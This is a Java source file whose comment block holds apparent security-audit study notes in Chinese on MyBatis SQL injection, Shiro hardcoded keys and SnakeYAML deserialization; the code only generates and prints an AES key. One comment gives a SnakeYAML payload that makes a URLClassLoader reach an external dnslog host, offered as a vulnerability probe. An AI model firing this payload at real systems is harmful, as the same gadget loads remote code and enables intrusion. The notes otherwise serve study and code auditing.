package summary.safe;

import org.apache.commons.codec.binary.Base64;
import summary.mq.Base;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.security.NoSuchAlgorithmException;



public class Summary1 {
    /**
     * mybatis为了防止sql注入需要使用#代替$
     * 但是在like模糊查询的时候 #是不起作用的
     * 推荐使用like concat 因为concat里面可以使用#
     *
     * in 后面加#也会报错
     * in后面改成foreach 然后使用#
     *
     *  order by后面不是直接跟$
     *  而是用if去判断如果id不为空就oder by id
     *  或者一些必须要使用$就先把所有查询出来 然后在代码层面分组或者排序
     *
     *
     * 重点关注 like in order by
     *
     *  # 是通过prepareStatement的预编译的，会对自动传入的数据加一个单引号。
     *
     *
     *  Python2打开HttpServer
     *  python -m SimpleHTTPServer
     *
     *  python3打开HttpServer
     *  python -m http.server
     *
     *
     * 
     * shiro的key如果写死
     * 加密时候先AES在Base64
     *
     *
     * 找个shiro的权限绕过漏洞、反序列化漏洞复现一下
     *
     * SnakeYaml 反序列化复现
     * payload
     * org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://a85o5r.dnslog.cn/"]]]]')
     * 里面的地址换成自己的dns地址
     * 执行payload 之后 dnslog就会有记录 就说明是有漏洞的
     * 审计时候搜索SnakeYaml 然后注意看是否转换成TAG 全局搜索tag:yaml.org 如果没转就可能存在漏洞
     * SnakeYml使用时候用yml.dump和load
     * 如果使用了yml的函数做序列化 没有转成tag:yaml就会存在漏洞
     * 漏洞原理
     * SnakeYml是解析yml格式的 用于Java对象序列化，可以构造payload执行命令执行
     *
     *
     *
     */
    public static void main(String[] args) throws NoSuchAlgorithmException {
        Base64 base64 = new Base64();
        KeyGenerator keygen = KeyGenerator.getInstance("AES");
        SecretKey deskey = keygen.generateKey();
        System.out.println(base64.encodeToString(deskey.getEncoded()));
    }



}
